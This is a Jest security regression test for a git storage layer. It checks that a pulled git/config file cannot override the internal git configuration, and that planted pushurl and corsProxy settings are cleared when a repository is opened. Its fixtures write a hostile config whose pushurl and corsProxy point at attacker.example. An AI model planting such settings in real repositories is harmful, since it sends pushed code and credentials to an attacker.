import { describe, expect, it } from '@jest/globals';
import * as git from 'isomorphic-git';

import GitVCS, { GIT_CLONE_DIR, GIT_INSOMNIA_DIR, GIT_INTERNAL_DIR } from '../git-vcs';
import { MemClient } from '../mem-client';
import { routableFSClient } from '../routable-fs-client';

const author = { name: 'a', email: 'a@example.com', timestamp: 1, timezoneOffset: 0 };
const PLANTED_CONFIG = `[core]
\trepositoryformatversion = 0
\tbare = false
[remote "origin"]
\turl = https://github.com/owner/repo.git
\tfetch = +refs/heads/*:refs/remotes/origin/*
\tpushurl = https://attacker.example/steal.git
[http]
\tcorsProxy = https://attacker.example/proxy
`;

// the layout git-actions.tsx sets up: the work tree, .insomnium and the git dir in separate stores
const appLayout = () => {
  const workTree = MemClient.createClient();
  const gitData = MemClient.createClient();
  const fs = routableFSClient(workTree, { [GIT_INSOMNIA_DIR]: MemClient.createClient(), [GIT_INTERNAL_DIR]: gitData });
  return { workTree, gitData, fs, opts: { fs, dir: GIT_CLONE_DIR, gitdir: GIT_INTERNAL_DIR } };
};

describe('the internal git dir', () => {
  it('cannot be written by a pulled repository file at git/config', async () => {
    const { workTree, opts } = appLayout();
    await git.init({ ...opts, defaultBranch: 'main' });
    await git.addRemote({ ...opts, remote: 'origin', url: 'https://github.com/owner/repo.git', force: true });
    await opts.fs.promises.mkdir(GIT_INSOMNIA_DIR);
    await opts.fs.promises.writeFile(`${GIT_INSOMNIA_DIR}/a.txt`, 'hello');
    await git.add({ ...opts, filepath: '.insomnium/a.txt' });
    const first = await git.commit({ ...opts, message: 'one', author });

    // a commit that adds git/config to the work tree
    const insomnium = await git.writeTree({ ...opts, tree: [{ mode: '100644', path: 'a.txt', oid: await git.writeBlob({ ...opts, blob: Buffer.from('hello') }), type: 'blob' }] });
    const gitFolder = await git.writeTree({ ...opts, tree: [{ mode: '100644', path: 'config', oid: await git.writeBlob({ ...opts, blob: Buffer.from(PLANTED_CONFIG) }), type: 'blob' }] });
    const tree = await git.writeTree({ ...opts, tree: [
      { mode: '040000', path: '.insomnium', oid: insomnium, type: 'tree' },
      { mode: '040000', path: 'git', oid: gitFolder, type: 'tree' },
    ] });
    const planted = await git.writeCommit({ ...opts, commit: { message: 'plant\n', tree, parent: [first], author, committer: author } });
    await git.writeRef({ ...opts, ref: 'refs/heads/incoming', value: planted });

    // what a pull does after fetching
    await git.merge({ ...opts, ours: 'main', theirs: 'incoming', author });
    await git.checkout({ ...opts, ref: 'main' });

    expect(await git.getConfig({ ...opts, path: 'remote.origin.pushurl' })).toBeUndefined();
    expect(await git.getConfig({ ...opts, path: 'http.corsProxy' })).toBeUndefined();
    // it is just a work-tree file
    expect((await workTree.promises.readFile('git/config')).toString()).toBe(PLANTED_CONFIG);
  });

  it('is cleaned of a pushurl or corsProxy planted before this fix when the repo is opened', async () => {
    const { opts } = appLayout();
    await git.init({ ...opts, defaultBranch: 'main' });
    await git.setConfig({ ...opts, path: 'remote.origin.pushurl', value: 'https://attacker.example/steal.git' });
    await git.setConfig({ ...opts, path: 'http.corsProxy', value: 'https://attacker.example/proxy' });

    await GitVCS.init({ uri: '', repoId: '', directory: GIT_CLONE_DIR, fs: opts.fs, gitDirectory: GIT_INTERNAL_DIR });

    expect(await git.getConfig({ ...opts, path: 'remote.origin.pushurl' })).toBeUndefined();
    expect(await git.getConfig({ ...opts, path: 'http.corsProxy' })).toBeUndefined();
  });
});

describe('routableFSClient', () => {
  it('routes by whole path segments', async () => {
    const workTree = MemClient.createClient();
    const gitData = MemClient.createClient();
    const fs = routableFSClient(workTree, { [GIT_INTERNAL_DIR]: gitData }).promises;
    await fs.writeFile('gitfoo.txt', 'a');
    await fs.mkdir('git');
    await fs.writeFile('git/config', 'b');
    await fs.mkdir(GIT_INTERNAL_DIR);
    await fs.writeFile(`${GIT_INTERNAL_DIR}/config`, 'c');
    expect((await workTree.promises.readFile('gitfoo.txt')).toString()).toBe('a');
    expect((await workTree.promises.readFile('git/config')).toString()).toBe('b');
    expect((await gitData.promises.readFile(`${GIT_INTERNAL_DIR}/config`)).toString()).toBe('c');
    await expect(gitData.promises.readFile('gitfoo.txt')).rejects.toThrow();
  });
});
